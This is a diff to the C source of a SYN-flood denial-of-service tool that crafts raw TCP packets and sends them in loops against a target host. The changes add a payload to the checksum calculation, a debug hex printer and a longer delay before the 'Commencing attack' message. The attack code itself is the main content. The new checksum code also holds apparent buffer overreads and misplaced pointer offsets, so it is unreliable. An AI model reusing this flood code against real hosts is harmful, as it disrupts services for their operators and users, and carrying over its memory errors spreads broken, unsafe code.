@@ -93,6 +93,14 @@ setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
   tcp_headers->th_urp = 0x00;
 }
 
+void printhex ( uint16_t *buffer , int size ) {
+  int i=0 ; 
+  printf ( "size:%d \n" , size ) ; 
+  for ( i=0 ; i < size ; i++ ) 
+    printf ( "%04x %c ", buffer[i] ,  buffer[i] ) ; 
+  printf ( "\n" ) ; 
+}
+
 
 /**
  * TCP uses a special checksum algorithm whereby the checksum is not only calculated
@@ -104,9 +112,10 @@ setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
  * Note: in our given scenario, there will never be an "odd byte".
 */
 uint16_t
-pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
+pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers, int sop , uint8_t payload[PAYLOAD]  )
 {
-  uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t)];
+  uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t) + PAYLOAD ]; 
+  /* uint16_t chksum_buffer[sizeof(tcp_pseudo_header_t) ]; */ 
 
   /* First populate the pseudo header. */
   tcp_pseudo_header_t *pheader = (tcp_pseudo_header_t *) chksum_buffer;
@@ -115,12 +124,17 @@ pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
   pheader->proto = ip_headers->protocol;
   pheader->rsvd = 0x0;
   pheader->seglen = htons(20);
-  memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr));
+  memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr) + PAYLOAD ); 
+  /* memcpy(&pheader->thdr, tcp_headers, sizeof(struct tcphdr) ); */ 
 
   /* Now compute the checksum following the steps listed in the RFC. */
   long chksum = 0;
+#ifdef WITHPAYLOAD
+  strncpy ( (char*)(chksum_buffer+PACKET_BUFFER_LEN), (char*)payload , sop ) ;  
+#endif
   uint16_t *ptr = chksum_buffer;
-  size_t count = sizeof(tcp_pseudo_header_t);
+  size_t count = sizeof(tcp_pseudo_header_t) + sop ;
+  printf ( "count %d , sop %d \n" , (int)count , sop ) ; 
   while (count > 1) {
     chksum += *ptr;
     ++ptr;
@@ -159,6 +173,7 @@ synflood_t (char *hostname, struct sockaddr_in host_addr)
   int sockfd = getRawSocket();
 
   uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
+  uint8_t payload[PAYLOAD]; 
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
 
@@ -178,7 +193,8 @@ synflood_t (char *hostname, struct sockaddr_in host_addr)
 #ifdef WITHPAYLOAD
     sop = addpayload(packet, 't') ; 
 #endif
-    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
+    strncpy ( (char*)payload , (char*)(packet+PACKET_BUFFER_LEN) , sop ) ; 
+    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers, sop , payload );
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
@@ -196,6 +212,7 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
   int sockfd = getRawSocket();
 
   uint8_t packet[PACKET_BUFFER_LEN+PAYLOAD];
+  uint8_t payload[PAYLOAD]; 
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
   int i ; 	/* laufvariable */ 
@@ -218,8 +235,11 @@ synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
     currentport = currentport % ( maxports + 1 ) ; 
 #ifdef WITHPAYLOAD
     sop = addpayload(packet, 'c') ;  
+    /* wenn sop = 0 ; dann passt checksum und frame ist ohne payload */ 
 #endif
-    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
+    strncpy ( (char*)payload , (char*)(packet+PACKET_BUFFER_LEN) , sop ) ; 
+    /* printf ( "payload: %s \n" , payload ) ; */ 
+    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers, sop , payload );
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN+sop, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
@@ -299,8 +319,8 @@ main (int argc, char *argv[], char *envp[])
       vlog ( "number of ports (%d) is greater than loop-count (%d) - this doesn't make sense \n" , maxports + 1 , loop_count ) ; 
   }
 
-  vlog("Commencing attack in %d %s.\n", wait_time, wait_time == 1 ? "second" : "seconds");
-  sleep(wait_time);
+  vlog("Commencing attack in %d %s.\n", wait_time+1, wait_time == 1 ? "second" : "seconds");
+  sleep(wait_time+1);
 
   struct timeval time;
   int64_t s1 , s2 , s3 , s4 , s5 , s6 ; 
